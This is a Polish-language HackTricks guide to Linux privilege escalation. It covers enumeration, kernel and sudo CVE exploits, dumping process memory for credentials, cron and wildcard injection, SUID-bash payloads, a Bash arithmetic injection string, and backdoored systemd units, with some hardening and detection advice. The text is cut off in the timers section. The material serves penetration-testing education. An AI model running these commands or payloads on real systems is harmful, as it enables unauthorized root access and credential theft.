# Linux Privilege Escalation

{{#include ../../banners/hacktricks-training.md}}

## Informacje o systemie

### Informacje o OS

Zacznijmy od zdobycia kilku informacji o działającym OS
```bash
(cat /proc/version || uname -a ) 2>/dev/null
lsb_release -a 2>/dev/null # old, not by default on many systems
cat /etc/os-release 2>/dev/null # universal on modern systems
```
### Ścieżka

Jeśli **masz uprawnienia do zapisu w dowolnym folderze wewnątrz zmiennej `PATH`** możesz być w stanie przejąć niektóre biblioteki lub binaria:
```bash
echo $PATH
```
### Informacje o środowisku

Czy w zmiennych środowiskowych są ciekawe informacje, hasła lub klucze API?
```bash
(env || set) 2>/dev/null
```
### Exploity jądra

Sprawdź wersję jądra i czy istnieje jakiś exploit, który można użyć do eskalacji uprawnień
```bash
cat /proc/version
uname -a
searchsploit "Linux Kernel"
```
Możesz znaleźć dobrą listę podatnych jąder oraz już **skompilowane exploity** tutaj: [https://github.com/lucyoa/kernel-exploits](https://github.com/lucyoa/kernel-exploits) i [exploitdb sploits](https://gitlab.com/exploit-database/exploitdb-bin-sploits).\
Inne strony, gdzie możesz znaleźć niektóre **skompilowane exploity**: [https://github.com/bwbwbwbw/linux-exploit-binaries](https://github.com/bwbwbwbw/linux-exploit-binaries), [https://github.com/Kabot/Unix-Privilege-Escalation-Exploits-Pack](https://github.com/Kabot/Unix-Privilege-Escalation-Exploits-Pack)

Aby wyodrębnić wszystkie podatne wersje jądra z tej strony, możesz wykonać:
```bash
curl https://raw.githubusercontent.com/lucyoa/kernel-exploits/master/README.md 2>/dev/null | grep "Kernels: " | cut -d ":" -f 2 | cut -d "<" -f 1 | tr -d "," | tr ' ' '\n' | grep -v "^\d\.\d$" | sort -u -r | tr '\n' ' '
```
Narzędzia, które mogą pomóc w wyszukiwaniu kernel exploits, to:

[linux-exploit-suggester.sh](https://github.com/mzet-/linux-exploit-suggester)\
[linux-exploit-suggester2.pl](https://github.com/jondonas/linux-exploit-suggester-2)\
[linuxprivchecker.py](http://www.securitysift.com/download/linuxprivchecker.py) (uruchomione NA ofierze, sprawdza tylko exploits dla kernel 2.x)

Zawsze **wyszukuj wersję kernela w Google**, może twoja wersja kernela jest opisana w jakimś kernel exploit i wtedy będziesz pewien, że ten exploit jest poprawny.

Dodatkowe techniki exploitacji kernela:

{{#ref}}
../../binary-exploitation/linux-kernel-exploitation/adreno-a7xx-sds-rb-priv-bypass-gpu-smmu-kernel-rw.md
{{#endref}}
{{#ref}}
../../binary-exploitation/linux-kernel-exploitation/arm64-static-linear-map-kaslr-bypass.md
{{#endref}}

### CVE-2016-5195 (DirtyCow)

Linux Privilege Escalation - Linux Kernel <= 3.19.0-73.8
```bash
# make dirtycow stable
echo 0 > /proc/sys/vm/dirty_writeback_centisecs
g++ -Wall -pedantic -O2 -std=c++11 -pthread -o dcow 40847.cpp -lutil
https://github.com/dirtycow/dirtycow.github.io/wiki/PoCs
https://github.com/evait-security/ClickNRoot/blob/master/1/exploit.c
```
### Wersja Sudo

Na podstawie podatnych wersji sudo, które pojawiają się w:
```bash
searchsploit sudo
```
Możesz sprawdzić, czy wersja sudo jest podatna, używając tego grep.
```bash
sudo -V | grep "Sudo ver" | grep "1\.[01234567]\.[0-9]\+\|1\.8\.1[0-9]\*\|1\.8\.2[01234567]"
```
### Sudo < 1.9.17p1

Wersje Sudo wcześniejsze niż 1.9.17p1 (**1.9.14 - 1.9.17 < 1.9.17p1**) pozwalają nieuprzywilejowanym użytkownikom lokalnym na podniesienie uprawnień do root przez opcję sudo `--chroot`, gdy plik `/etc/nsswitch.conf` jest używany z katalogu kontrolowanego przez użytkownika.

Oto [PoC](https://github.com/pr0v3rbs/CVE-2025-32463_chwoot) do wykorzystania tej [vulnerability](https://nvd.nist.gov/vuln/detail/CVE-2025-32463). Przed uruchomieniem exploita upewnij się, że Twoja wersja `sudo` jest podatna i obsługuje funkcję `chroot`.

Więcej informacji znajdziesz w oryginalnym [vulnerability advisory](https://www.stratascale.com/resource/cve-2025-32463-sudo-chroot-elevation-of-privilege/)

### Sudo host-based rules bypass (CVE-2025-32462)

Sudo przed 1.9.17p1 (zgłoszony zakres podatności: **1.8.8–1.9.17**) może oceniać host-based reguły sudoers, używając **hostname podanego przez użytkownika** z `sudo -h <host>` zamiast **rzeczywistego hostname**. Jeśli sudoers przyznaje szersze uprawnienia na innym hoście, możesz lokalnie **spoof**ować ten host.

Wymagania:
- Podatna wersja sudo
- Reguły sudoers zależne od hosta (host nie jest ani bieżącym hostname, ani `ALL`)

Przykład wzorca sudoers:
```
Host_Alias     SERVERS = devbox, prodbox
Host_Alias     PROD    = prodbox
alice          SERVERS, !PROD = NOPASSWD:ALL
```
Eksploituj przez podszycie się pod dozwolony host:
```bash
sudo -h devbox id
sudo -h devbox -i
```
Jeśli rozwiązywanie spoofed name blokuje, dodaj je do `/etc/hosts` albo użyj hostname, które już pojawia się w logach/konfiguracjach, aby uniknąć zapytań DNS.

#### sudo < v1.8.28

Od @sickrov
```
sudo -u#-1 /bin/bash
```
### Weryfikacja sygnatury Dmesg nie powiodła się

Sprawdź **smasher2 box of HTB** jako **przykład** tego, jak ta podatność może zostać wykorzystana
```bash
dmesg 2>/dev/null | grep "signature"
```
### Więcej system enumeration
```bash
date 2>/dev/null #Date
(df -h || lsblk) #System stats
lscpu #CPU info
lpstat -a 2>/dev/null #Printers info
```
## Wylicz możliwe zabezpieczenia

### AppArmor
```bash
if [ `which aa-status 2>/dev/null` ]; then
aa-status
elif [ `which apparmor_status 2>/dev/null` ]; then
apparmor_status
elif [ `ls -d /etc/apparmor* 2>/dev/null` ]; then
ls -d /etc/apparmor*
else
echo "Not found AppArmor"
fi
```
### Grsecurity
```bash
((uname -r | grep "\-grsec" >/dev/null 2>&1 || grep "grsecurity" /etc/sysctl.conf >/dev/null 2>&1) && echo "Yes" || echo "Not found grsecurity")
```
### PaX
```bash
(which paxctl-ng paxctl >/dev/null 2>&1 && echo "Yes" || echo "Not found PaX")
```
### Execshield
```bash
(grep "exec-shield" /etc/sysctl.conf || echo "Not found Execshield")
```
### SElinux
```bash
(sestatus 2>/dev/null || echo "Not found sestatus")
```
### ASLR
```bash
cat /proc/sys/kernel/randomize_va_space 2>/dev/null
#If 0, not enabled
```
## Container Breakout

Jeśli jesteś wewnątrz kontenera, zacznij od poniższej sekcji container-security, a następnie przejdź do stron dotyczących nadużyć specyficznych dla runtime:


{{#ref}}
container-security/
{{#endref}}

## Drives

Sprawdź **co jest zamontowane i odmontowane**, gdzie i dlaczego. Jeśli coś jest odmontowane, możesz spróbować to zamontować i sprawdzić, czy zawiera prywatne informacje
```bash
ls /dev 2>/dev/null | grep -i "sd"
cat /etc/fstab 2>/dev/null | grep -v "^#" | grep -Pv "\W*\#" 2>/dev/null
#Check if credentials in fstab
grep -E "(user|username|login|pass|password|pw|credentials)[=:]" /etc/fstab /etc/mtab 2>/dev/null
```
## Przydatne oprogramowanie

Wypisz przydatne binaria
```bash
which nmap aws nc ncat netcat nc.traditional wget curl ping gcc g++ make gdb base64 socat python python2 python3 python2.7 python2.6 python3.6 python3.7 perl php ruby xterm doas sudo fetch docker lxc ctr runc rkt kubectl 2>/dev/null
```
Sprawdź też, czy **jest zainstalowany jakiś kompilator**. Jest to przydatne, jeśli musisz użyć jakiegoś exploit’a na kernel, ponieważ zaleca się skompilować go na maszynie, na której zamierzasz go użyć (lub na podobnej).
```bash
(dpkg --list 2>/dev/null | grep "compiler" | grep -v "decompiler\|lib" 2>/dev/null || yum list installed 'gcc*' 2>/dev/null | grep gcc 2>/dev/null; which gcc g++ 2>/dev/null || locate -r "/gcc[0-9\.-]\+$" 2>/dev/null | grep -v "/doc/")
```
### Zainstalowane podatne oprogramowanie

Sprawdź **wersję zainstalowanych pakietów i usług**. Może jest tam jakaś stara wersja Nagiosa (na przykład), którą można wykorzystać do podniesienia uprawnień…\
Zaleca się ręcznie sprawdzić wersję bardziej podejrzanego zainstalowanego oprogramowania.
```bash
dpkg -l #Debian
rpm -qa #Centos
```
Jeśli masz dostęp SSH do maszyny, możesz również użyć **openVAS**, aby sprawdzić przestarzałe i podatne na ataki oprogramowanie zainstalowane wewnątrz maszyny.

> [!NOTE] > _Zauważ, że te polecenia pokażą dużo informacji, które w większości będą bezużyteczne, dlatego zaleca się użycie niektórych aplikacji, takich jak OpenVAS lub podobnych, które sprawdzą, czy jakaś zainstalowana wersja oprogramowania jest podatna na znane exploity_

## Processes

Sprawdź, **jakie procesy** są wykonywane i zweryfikuj, czy jakiś proces ma **więcej uprawnień, niż powinien** (może tomcat uruchomiony przez root?)
```bash
ps aux
ps -ef
top -n 1
```
Zawsze sprawdzaj, czy nie działają **electron/cef/chromium debuggers**, możesz to wykorzystać do eskalacji uprawnień](electron-cef-chromium-debugger-abuse.md). **Linpeas** wykrywa je, sprawdzając parametr `--inspect` w linii poleceń procesu.\
Sprawdź też **swoje uprawnienia względem binarek procesów**, może możesz coś nadpisać.

### Cross-user parent-child chains

Proces potomny działający pod **innym użytkownikiem** niż jego rodzic nie jest automatycznie złośliwy, ale jest użytecznym **sygnałem triage**. Niektóre przejścia są oczekiwane (`root` uruchamiający użytkownika usługi, menedżery logowania tworzące procesy sesji), ale nietypowe łańcuchy mogą ujawniać wrappery, debug helpers, persistence albo słabe granice zaufania runtime.

Szybki przegląd:
```bash
ps -eo pid,ppid,user,comm,args --sort=ppid
pstree -alp
```
Jeśli znajdziesz zaskakujący chain, sprawdź parent command line oraz wszystkie pliki, które wpływają na jego zachowanie (`config`, `EnvironmentFile`, helper scripts, working directory, writable arguments). W kilku rzeczywistych ścieżkach privesc sam child nie był writable, ale **parent-controlled config** albo helper chain już tak.

### Deleted executables and deleted-open files

Runtime artifacts są często nadal dostępne **after deletion**. Jest to przydatne zarówno do privilege escalation, jak i do odzyskiwania evidence z procesu, który ma już otwarte sensitive files.

Sprawdź deleted executables:
```bash
pid=<PID>
ls -l /proc/$pid/exe
readlink /proc/$pid/exe
tr '\0' ' ' </proc/$pid/cmdline; echo
```
Jeśli `/proc/<PID>/exe` wskazuje na `(deleted)`, proces nadal uruchamia stary obraz binarny z pamięci. To jest silny sygnał, aby to zbadać, ponieważ:

- usunięty plik wykonywalny może zawierać interesujące ciągi znaków lub poświadczenia
- działający proces może nadal ujawniać przydatne deskryptory plików
- usunięty uprzywilejowany binary może wskazywać na niedawną ingerencję lub próbę czyszczenia

Zbierz globalnie usunięte, otwarte pliki:
```bash
lsof +L1
```
Jeśli znajdziesz interesujący deskryptor, odzyskaj go bezpośrednio:
```bash
ls -l /proc/<PID>/fd
cat /proc/<PID>/fd/<FD>
```
Jest to szczególnie cenne, gdy proces nadal ma otwarty usunięty secret, script, export bazy danych lub flag file.

### Process monitoring

Możesz użyć narzędzi takich jak [**pspy**](https://github.com/DominicBreuker/pspy), aby monitorować procesy. Może to być bardzo przydatne do identyfikowania podatnych procesów uruchamianych często albo wtedy, gdy spełniony jest określony zestaw wymagań.

### Process memory

Niektóre usługi serwera zapisują **credentials w postaci jawnego tekstu w pamięci**.\
Zwykle potrzebujesz **root privileges**, aby odczytać pamięć procesów należących do innych użytkowników, dlatego jest to najczęściej bardziej użyteczne, gdy już masz root i chcesz znaleźć więcej credentials.\
Pamiętaj jednak, że **jako zwykły użytkownik możesz odczytać pamięć procesów, których jesteś właścicielem**.

> [!WARNING]
> Zwróć uwagę, że obecnie większość maszyn **domyślnie nie pozwala na ptrace**, co oznacza, że nie możesz zrzucać pamięci innych procesów należących do twojego nieuprzywilejowanego użytkownika.
>
> Plik _**/proc/sys/kernel/yama/ptrace_scope**_ kontroluje dostępność ptrace:
>
> - **kernel.yama.ptrace_scope = 0**: wszystkie procesy mogą być debugowane, o ile mają ten sam uid. To klasyczny sposób działania ptracing.
> - **kernel.yama.ptrace_scope = 1**: można debugować tylko proces nadrzędny.
> - **kernel.yama.ptrace_scope = 2**: tylko admin może używać ptrace, ponieważ wymaga to uprawnienia CAP_SYS_PTRACE.
> - **kernel.yama.ptrace_scope = 3**: Żadne procesy nie mogą być śledzone za pomocą ptrace. Po ustawieniu tego wymagany jest reboot, aby ponownie włączyć ptracing.

#### GDB

Jeśli masz dostęp do pamięci usługi FTP (na przykład), możesz pobrać Heap i przeszukać w nim credentials.
```bash
gdb -p <FTP_PROCESS_PID>
(gdb) info proc mappings
(gdb) q
(gdb) dump memory /tmp/mem_ftp <START_HEAD> <END_HEAD>
(gdb) q
strings /tmp/mem_ftp #User and password
```
#### Skrypt GDB
```bash:dump-memory.sh
#!/bin/bash
#./dump-memory.sh <PID>
grep rw-p /proc/$1/maps \
| sed -n 's/^\([0-9a-f]*\)-\([0-9a-f]*\) .*$/\1 \2/p' \
| while read start stop; do \
gdb --batch --pid $1 -ex \
"dump memory $1-$start-$stop.dump 0x$start 0x$stop"; \
done
```
#### /proc/$pid/maps & /proc/$pid/mem

Dla danego identyfikatora procesu, **maps pokazuje, jak pamięć jest odwzorowana w przestrzeni adresowej** tego procesu; pokazuje też **uprawnienia każdego odwzorowanego regionu**. Pseudo-plik **mem** **ujawnia samą pamięć procesu**. Z pliku **maps** wiemy, które **regiony pamięci są czytelne** oraz jakie są ich offsety. Używamy tych informacji, aby **przeszukać plik mem i zrzucić wszystkie czytelne regiony** do pliku.
```bash
procdump()
(
cat /proc/$1/maps | grep -Fv ".so" | grep " 0 " | awk '{print $1}' | ( IFS="-"
while read a b; do
dd if=/proc/$1/mem bs=$( getconf PAGESIZE ) iflag=skip_bytes,count_bytes \
skip=$(( 0x$a )) count=$(( 0x$b - 0x$a )) of="$1_mem_$a.bin"
done )
cat $1*.bin > $1.dump
rm $1*.bin
)
```
#### /dev/mem

`/dev/mem` zapewnia dostęp do **fizycznej** pamięci systemu, a nie do pamięci wirtualnej. Do przestrzeni wirtualnych adresów jądra można uzyskać dostęp używając /dev/kmem.\
Zwykle `/dev/mem` jest odczytywalny tylko przez **root** i grupę **kmem**.
```
strings /dev/mem -n10 | grep -i PASS
```
### ProcDump dla linux

ProcDump to linuxowa reinterpretacja klasycznego narzędzia ProcDump z pakietu Sysinternals dla Windows. Pobierz je z [https://github.com/Sysinternals/ProcDump-for-Linux](https://github.com/Sysinternals/ProcDump-for-Linux)
```
procdump -p 1714

ProcDump v1.2 - Sysinternals process dump utility
Copyright (C) 2020 Microsoft Corporation. All rights reserved. Licensed under the MIT license.
Mark Russinovich, Mario Hewardt, John Salem, Javid Habibi
Monitors a process and writes a dump file when the process meets the
specified criteria.

Process:		sleep (1714)
CPU Threshold:		n/a
Commit Threshold:	n/a
Thread Threshold:		n/a
File descriptor Threshold:		n/a
Signal:		n/a
Polling interval (ms):	1000
Threshold (s):	10
Number of Dumps:	1
Output directory for core dumps:	.

Press Ctrl-C to end monitoring without terminating the process.

[20:20:58 - WARN]: Procdump not running with elevated credentials. If your uid does not match the uid of the target process procdump will not be able to capture memory dumps
[20:20:58 - INFO]: Timed:
[20:21:00 - INFO]: Core dump 0 generated: ./sleep_time_2021-11-03_20:20:58.1714
```
### Tools

Aby zrzucić pamięć procesu, możesz użyć:

- [**https://github.com/Sysinternals/ProcDump-for-Linux**](https://github.com/Sysinternals/ProcDump-for-Linux)
- [**https://github.com/hajzer/bash-memory-dump**](https://github.com/hajzer/bash-memory-dump) (root) - \_Możesz ręcznie usunąć wymagania root i zrzucić proces należący do Ciebie
- Script A.5 z [**https://www.delaat.net/rp/2016-2017/p97/report.pdf**](https://www.delaat.net/rp/2016-2017/p97/report.pdf) (root jest wymagany)

### Credentials from Process Memory

#### Manual example

Jeśli stwierdzisz, że proces authenticator jest uruchomiony:
```bash
ps -ef | grep "authenticator"
root      2027  2025  0 11:46 ?        00:00:00 authenticator
```
Możesz zrzucić proces (zobacz poprzednie sekcje, aby znaleźć różne sposoby zrzutu pamięci procesu) i wyszukać poświadczenia w pamięci:
```bash
./dump-memory.sh 2027
strings *.dump | grep -i password
```
#### mimipenguin

Narzędzie [**https://github.com/huntergregal/mimipenguin**](https://github.com/huntergregal/mimipenguin) **ukradnie poświadczenia w postaci tekstu jawnego z pamięci** oraz z niektórych **dobrze znanych plików**. Do poprawnego działania wymaga uprawnień root.

| Feature                                           | Process Name         |
| ------------------------------------------------- | -------------------- |
| GDM password (Kali Desktop, Debian Desktop)       | gdm-password         |
| Gnome Keyring (Ubuntu Desktop, ArchLinux Desktop) | gnome-keyring-daemon |
| LightDM (Ubuntu Desktop)                          | lightdm              |
| VSFTPd (Active FTP Connections)                   | vsftpd               |
| Apache2 (Active HTTP Basic Auth Sessions)          | apache2              |
| OpenSSH (Active SSH Sessions - Sudo Usage)         | sshd:                |

#### Search Regexes/[truffleproc](https://github.com/controlplaneio/truffleproc)
```bash
# un truffleproc.sh against your current Bash shell (e.g. $$)
./truffleproc.sh $$
# coredumping pid 6174
Reading symbols from od...
Reading symbols from /usr/lib/systemd/systemd...
Reading symbols from /lib/systemd/libsystemd-shared-247.so...
Reading symbols from /lib/x86_64-linux-gnu/librt.so.1...
[...]
# extracting strings to /tmp/tmp.o6HV0Pl3fe
# finding secrets
# results in /tmp/tmp.o6HV0Pl3fe/results.txt
```
## Scheduled/Cron jobs

### Crontab UI (alseambusher) uruchomiony jako root – webowy scheduler privesc

Jeśli panel webowy „Crontab UI” (alseambusher/crontab-ui) działa jako root i jest dostępny tylko na loopback, nadal możesz uzyskać do niego dostęp przez SSH local port-forwarding i utworzyć uprzywilejowane zadanie, aby wykonać escalation.

Typowy chain
- Odkryj port dostępny tylko na loopback (np. 127.0.0.1:8000) oraz Basic-Auth realm za pomocą `ss -ntlp` / `curl -v localhost:8000`
- Znajdź credentials w artefaktach operacyjnych:
- Backups/scripts z `zip -P <password>`
- unit systemd ujawniający `Environment="BASIC_AUTH_USER=..."`, `Environment="BASIC_AUTH_PWD=..."`
- Tunnel i login:
```bash
ssh -L 9001:localhost:8000 user@target
# browse http://localhost:9001 and authenticate
```
- Utwórz zadanie o wysokich uprawnieniach i uruchom je natychmiast (tworzy powłokę SUID):
```bash
# Name: escalate
# Command:
cp /bin/bash /tmp/rootshell && chmod 6777 /tmp/rootshell
```
- Użyj go:
```bash
/tmp/rootshell -p   # root shell
```
Hardening
- Nie uruchamiaj Crontab UI jako root; ogranicz je, używając dedykowanego użytkownika i minimalnych uprawnień
- Binduj do localhost i dodatkowo ogranicz dostęp przez firewall/VPN; nie używaj ponownie haseł
- Unikaj osadzania sekretów w plikach unit; używaj secret stores lub root-only EnvironmentFile
- Włącz audit/logging dla uruchomień jobów na żądanie



Sprawdź, czy jakikolwiek scheduled job jest podatny. Może da się wykorzystać skrypt uruchamiany przez root (wildcard vuln? można modyfikować pliki używane przez root? użyć symlinks? utworzyć konkretne pliki w katalogu, z którego korzysta root?).
```bash
crontab -l
ls -al /etc/cron* /etc/at*
cat /etc/cron* /etc/at* /etc/anacrontab /var/spool/cron/crontabs/root 2>/dev/null | grep -v "^#"
```
Jeśli używany jest `run-parts`, sprawdź, które nazwy zostaną naprawdę wykonane:
```bash
run-parts --test /etc/cron.hourly
run-parts --test /etc/cron.daily
```
To unika fałszywych pozytywów. Zapisywalny katalog okresowy jest przydatny tylko wtedy, gdy nazwa pliku payload pasuje do lokalnych reguł `run-parts`.

### Cron path

Na przykład, wewnątrz _/etc/crontab_ możesz znaleźć PATH: _PATH=**/home/user**:/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin_

(_Zauważ, że użytkownik "user" ma uprawnienia do zapisu w /home/user_)

Jeśli w tym crontabie użytkownik root próbuje wykonać jakąś komendę lub skrypt bez ustawienia ścieżki. Na przykład: _\* \* \* \* root overwrite.sh_\
Wtedy możesz uzyskać root shell, używając:
```bash
echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' > /home/user/overwrite.sh
#Wait cron job to be executed
/tmp/bash -p #The effective uid and gid to be set to the real uid and gid
```
### Cron using a script with a wildcard (Wildcard Injection)

Jeśli skrypt wykonywany przez root ma “**\***” w poleceniu, możesz to wykorzystać, aby spowodować nieoczekiwane działania (np. privesc). Przykład:
```bash
rsync -a *.sh rsync://host.back/src/rbd #You can create a file called "-e sh myscript.sh" so the script will execute our script
```
**Jeśli wildcard jest poprzedzony ścieżką taką jak** _**/some/path/\***_ **, nie jest podatny (nawet** _**./\***_ **nie jest).**

Przeczytaj następującą stronę, aby poznać więcej trików z wildcard exploitation:


{{#ref}}
wildcards-spare-tricks.md
{{#endref}}


### Bash arithmetic expansion injection in cron log parsers

Bash wykonuje parameter expansion i command substitution przed arithmetic evaluation w ((...)), $((...)) i let. Jeśli root cron/parser odczytuje niezaufane pola logów i przekazuje je do kontekstu arytmetycznego, atakujący może wstrzyknąć command substitution $(...), które wykona się jako root, gdy cron zostanie uruchomiony.

- Why it works: W Bash kolejność expansions jest następująca: parameter/variable expansion, command substitution, arithmetic expansion, potem word splitting i pathname expansion. Dlatego wartość taka jak `$(/bin/bash -c 'id > /tmp/pwn')0` zostaje najpierw podmieniona (uruchamiając komendę), a potem pozostałe numeryczne `0` jest używane w arithmetic, dzięki czemu skrypt kontynuuje bez błędów.

- Typical vulnerable pattern:
```bash
#!/bin/bash
# Example: parse a log and "sum" a count field coming from the log
while IFS=',' read -r ts user count rest; do
# count is untrusted if the log is attacker-controlled
(( total += count ))     # or: let "n=$count"
done < /var/www/app/log/application.log
```

- Exploitation: Umieść tekst kontrolowany przez atakującego w parsowanym logu tak, aby pole wyglądające na liczbę zawierało command substitution i kończyło się cyfrą. Upewnij się, że Twoja komenda nie wypisuje nic na stdout (albo przekieruj to), aby arithmetic pozostała poprawna.
```bash
# Injected field value inside the log (e.g., via a crafted HTTP request that the app logs verbatim):
$(/bin/bash -c 'cp /bin/bash /tmp/sh; chmod +s /tmp/sh')0
# When the root cron parser evaluates (( total += count )), your command runs as root.
```

### Cron script overwriting and symlink

Jeśli **możesz zmodyfikować cron script** wykonywany przez root, możesz bardzo łatwo uzyskać shell:
```bash
echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' > </PATH/CRON/SCRIPT>
#Wait until it is executed
/tmp/bash -p
```
Jeśli skrypt wykonywany przez root używa **katalogu, do którego masz pełny dostęp**, może być przydatne usunięcie tego folderu i **utworzenie folderu-symlinka do innego**, który wskazuje na skrypt kontrolowany przez ciebie.
```bash
ln -d -s </PATH/TO/POINT> </PATH/CREATE/FOLDER>
```
### Walidacja symlinków i bezpieczniejsze operacje na plikach

Podczas przeglądania uprzywilejowanych skryptów/binarek, które odczytują lub zapisują pliki po ścieżce, sprawdź, jak obsługiwane są linki:

- `stat()` podąża za symlinkiem i zwraca metadane celu.
- `lstat()` zwraca metadane samego linku.
- `readlink -f` i `namei -l` pomagają rozwiązać końcowy cel i pokazują uprawnienia każdego składnika ścieżki.
```bash
readlink -f /path/to/link
namei -l /path/to/link
```
Dla defenderów/developers, bezpieczniejsze wzorce przeciwko sztuczkom z symlinkami to:

- `O_EXCL` z `O_CREAT`: fail, jeśli path już istnieje (blokuje wcześniej utworzone przez atakującego linki/pliki).
- `openat()`: operuj względem zaufanego deskryptora pliku directory.
- `mkstemp()`: twórz pliki tymczasowe atomowo z bezpiecznymi uprawnieniami.

### Custom-signed cron binaries with writable payloads
Blue teams czasem "sign" binaria uruchamiane przez cron, zapisując custom ELF section i szukając vendor string przed wykonaniem ich jako root. Jeśli to binary jest group-writable (np. `/opt/AV/periodic-checks/monitor` owned by `root:devs 770`) i możesz leak materiał do signing, możesz sfałszować section i przejąć cron task:

1. Użyj `pspy` do przechwycenia flow weryfikacji. W Era, root uruchamiał `objcopy --dump-section .text_sig=text_sig_section.bin monitor` następnie `grep -oP '(?<=UTF8STRING        :)Era Inc.' text_sig_section.bin` i potem wykonywał plik.
2. Odtwórz oczekiwany certificate używając wyciekłego klucza/config (z `signing.zip`):
```bash
openssl req -x509 -new -nodes -key key.pem -config x509.genkey -days 365 -out cert.pem
```
3. Zbuduj malicious replacement (np. drop SUID bash, dodaj swój SSH key) i embed certyfikat do `.text_sig`, żeby grep przeszedł:
```bash
gcc -fPIC -pie monitor.c -o monitor
objcopy --add-section .text_sig=cert.pem monitor
objcopy --dump-section .text_sig=text_sig_section.bin monitor
strings text_sig_section.bin | grep 'Era Inc.'
```
4. Nadpisz zaplanowany binary, zachowując execute bits:
```bash
cp monitor /opt/AV/periodic-checks/monitor
chmod 770 /opt/AV/periodic-checks/monitor
```
5. Poczekaj na następny run cron; gdy naiwna signature check się powiedzie, twój payload uruchomi się jako root.

### Frequent cron jobs

Możesz monitorować processy, aby szukać procesów uruchamianych co 1, 2 lub 5 minut. Może da się to wykorzystać i podnieść privileges.

Na przykład, aby **monitor every 0.1s during 1 minute**, **sort by less executed commands** i usunąć komendy, które były wykonane najczęściej, możesz zrobić:
```bash
for i in $(seq 1 610); do ps -e --format cmd >> /tmp/monprocs.tmp; sleep 0.1; done; sort /tmp/monprocs.tmp | uniq -c | grep -v "\[" | sed '/^.\{200\}./d' | sort | grep -E -v "\s*[6-9][0-9][0-9]|\s*[0-9][0-9][0-9][0-9]"; rm /tmp/monprocs.tmp;
```
**Możesz też użyć** [**pspy**](https://github.com/DominicBreuker/pspy/releases) (to będzie monitorować i wypisywać każdy proces, który się uruchamia).

### Kopie zapasowe root zachowujące ustawione przez atakującego bity trybu (pg_basebackup)

Jeśli cron uruchamiany jako root owija `pg_basebackup` (lub dowolne rekurencyjne kopiowanie) względem katalogu bazy danych, do którego możesz zapisywać, możesz umieścić **binarkę SUID/SGID**, która zostanie skopiowana ponownie jako **root:root** z tymi samymi bitami trybu do wyniku kopii zapasowej.

Typowy przepływ wykrywania (jako użytkownik DB bez uprawnień):
- Użyj `pspy`, aby zauważyć root cron wywołujący coś w stylu `/usr/lib/postgresql/14/bin/pg_basebackup -h /var/run/postgresql -U postgres -D /opt/backups/current/` co minutę.
- Potwierdź, że źródłowy klaster (np. `/var/lib/postgresql/14/main`) jest dla ciebie zapisywalny, a cel (`/opt/backups/current`) po zadaniu staje się własnością root.

Exploit:
```bash
# As the DB service user owning the cluster directory
cd /var/lib/postgresql/14/main
cp /bin/bash .
chmod 6777 bash

# Wait for the next root backup run (pg_basebackup preserves permissions)
ls -l /opt/backups/current/bash  # expect -rwsrwsrwx 1 root root ... bash
/opt/backups/current/bash -p    # root shell without dropping privileges
```
To działa, ponieważ `pg_basebackup` zachowuje bity trybu plików podczas kopiowania klastra; gdy jest uruchamiany przez root, pliki docelowe dziedziczą **własność root + wybrany przez atakującego SUID/SGID**. Każda podobna uprzywilejowana procedura backup/copy, która zachowuje uprawnienia i zapisuje do wykonywalnej lokalizacji, jest podatna.

### Invisible cron jobs

Możliwe jest utworzenie cronjob **poprzez dodanie carriage return po komentarzu** (bez znaku newline), i cron job będzie działał. Przykład (zwróć uwagę na znak carriage return):
```bash
#This is a comment inside a cron config file\r* * * * * echo "Surprise!"
```
Aby wykryć tego rodzaju stealth entry, sprawdzaj pliki cron za pomocą narzędzi, które ujawniają znaki sterujące:
```bash
cat -A /etc/crontab
cat -A /etc/cron.d/*
sed -n 'l' /etc/crontab /etc/cron.d/* 2>/dev/null
xxd /etc/crontab | head
```
## Services

### Zapisywalne pliki _.service_

Sprawdź, czy możesz zapisać dowolny plik `.service`. Jeśli tak, **możesz go zmodyfikować**, aby **uruchamiał** twoją **backdoor**, gdy usługa jest **uruchamiana**, **restartowana** lub **zatrzymywana** (być może będziesz musiał poczekać, aż maszyna zostanie zrestartowana).\
Na przykład utwórz swoją backdoor wewnątrz pliku .service z **`ExecStart=/tmp/script.sh`**

### Zapisywalne binaria usług

Pamiętaj, że jeśli masz **uprawnienia do zapisu nad binariami wykonywanymi przez usługi**, możesz podmienić je na backdoors, aby gdy usługi zostaną ponownie uruchomione, backdoors zostaną wykonane.

### systemd PATH - Relative Paths

Możesz zobaczyć PATH używany przez **systemd** za pomocą:
```bash
systemctl show-environment
```
Jeśli okaże się, że możesz **zapisywać** w którymkolwiek z folderów na tej ścieżce, możesz być w stanie **eskalować uprawnienia**. Musisz szukać **relative paths** używanych w plikach **service configurations** takich jak:
```bash
ExecStart=faraday-server
ExecStart=/bin/sh -ec 'ifup --allow=hotplug %I; ifquery --state %I'
ExecStop=/bin/sh "uptux-vuln-bin3 -stuff -hello"
```
Następnie utwórz **wykonywalny plik** o **tej samej nazwie co binarka z relatywnej ścieżki** w folderze PATH systemd, do którego możesz pisać, a gdy usługa zostanie poproszona o wykonanie podatnej akcji (**Start**, **Stop**, **Reload**), twój **backdoor zostanie uruchomiony** (nieuprzywilejowani użytkownicy zwykle nie mogą uruchamiać/zatrzymywać usług, ale sprawdź, czy możesz użyć `sudo -l`).

**Dowiedz się więcej o usługach za pomocą `man systemd.service`.**

## **Timers**

**Timers** to pliki jednostek systemd, których nazwa kończy się na `**.timer**`, i które kontrolują pliki `**.service**` lub zdarzenia. **Timers** mogą być używane jako alternatywa dla cron, ponieważ mają wbudowane wsparcie dla zdarzeń czasu kalendarzowego i zdarzeń czasu monotonicznego oraz mogą być uruchamiane asynchronicznie.

Możesz wylistować wszystkie timery za pomocą:
```bash
systemctl list-timers --all
```
### Zapisywalne timery

Jeśli możesz zmodyfikować timer, możesz sprawić, że wykona coś z istniejących elementów systemd.unit (takich jak `.service` lub `.target`)
```bash
Unit=backdoor.service
```
W dokumentacji możesz przeczytać, czym jest Unit:

> The unit to activate when this timer elapses. The argument is a unit name, whose suffix is not ".timer". If not specified, this value defaults to a service that has the same name as the timer unit, except for the suffix. (See above.) It is recommended that the unit name that is activated and the unit name of the timer unit are named identically, except for the suffix.

Dlatego, aby nadużyć to uprawnienie, musisz:

- Znaleźć jakiś systemd unit (np. `.service`), który **uruchamia zapisywalny binary**
